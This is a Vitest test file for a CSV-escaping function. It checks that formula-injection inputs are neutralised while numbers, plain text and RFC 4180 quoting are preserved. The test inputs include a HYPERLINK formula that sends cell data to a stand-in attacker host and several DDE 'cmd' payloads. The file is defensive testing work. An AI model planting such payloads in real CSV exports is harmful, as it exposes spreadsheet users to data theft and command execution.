import { describe, it, expect } from 'vitest';
import { escapeCsvField } from '../src/utils/csv.js';

describe('CSV Security & Formula Injection Defense (OWASP)', () => {
  it('neutralizes formula injection starting with =', () => {
    const payload = '=HYPERLINK("http://attacker.example/steal?d="&A1,"Click")';
    const escaped = escapeCsvField(payload);
    expect(escaped).toBe(`"'=HYPERLINK(""http://attacker.example/steal?d=""&A1,""Click"")"`);
    expect(escaped.startsWith(`"'=`)).toBe(true);
  });

  it('neutralizes formula injection starting with @', () => {
    const payload = '@SUM(1+1)*cmd|\'/c calc\'!A0';
    const escaped = escapeCsvField(payload);
    expect(escaped.startsWith(`'@SUM`)).toBe(true);
  });

  it('neutralizes formula injection starting with + and command payload', () => {
    const payload = '+cmd|\'/c calc\'!A0';
    const escaped = escapeCsvField(payload);
    expect(escaped.startsWith(`'+cmd`)).toBe(true);
  });

  it('neutralizes formula injection starting with - and command payload', () => {
    const payload = '-cmd|\'/c calc\'!A0';
    const escaped = escapeCsvField(payload);
    expect(escaped.startsWith(`'-cmd`)).toBe(true);
  });

  it('neutralizes formula injection with leading whitespace', () => {
    const payload = '   =1+1';
    const escaped = escapeCsvField(payload);
    expect(escaped).toBe(`'   =1+1`);
  });

  it('neutralizes formula injection starting with tab character', () => {
    const payload = '\t=1+1';
    const escaped = escapeCsvField(payload);
    expect(escaped.startsWith(`'\t`)).toBe(true);
  });

  it('preserves legitimate negative numbers as raw numbers without prepending single quote', () => {
    expect(escapeCsvField(-125.5)).toBe('-125.5');
    expect(escapeCsvField('-125.50')).toBe('-125.50');
    expect(escapeCsvField(-5000)).toBe('-5000');
    expect(escapeCsvField('-5000')).toBe('-5000');
  });

  it('preserves legitimate positive numbers as raw numbers without prepending single quote', () => {
    expect(escapeCsvField(2500)).toBe('2500');
    expect(escapeCsvField('+100')).toBe('+100');
    expect(escapeCsvField(0)).toBe('0');
  });

  it('preserves standard alphanumeric descriptions without prepending single quote', () => {
    expect(escapeCsvField('Salary Credit')).toBe('Salary Credit');
    expect(escapeCsvField('Starbucks Coffee')).toBe('Starbucks Coffee');
  });

  it('correctly handles RFC 4180 CSV escaping for quotes, commas, and newlines', () => {
    expect(escapeCsvField('Apples, Oranges')).toBe('"Apples, Oranges"');
    expect(escapeCsvField('He said "Hello"')).toBe('"He said ""Hello"""');
    expect(escapeCsvField('Line 1\nLine 2')).toBe('"Line 1\nLine 2"');
  });

  it('handles null and undefined by returning empty string', () => {
    expect(escapeCsvField(null)).toBe('');
    expect(escapeCsvField(undefined)).toBe('');
  });
});
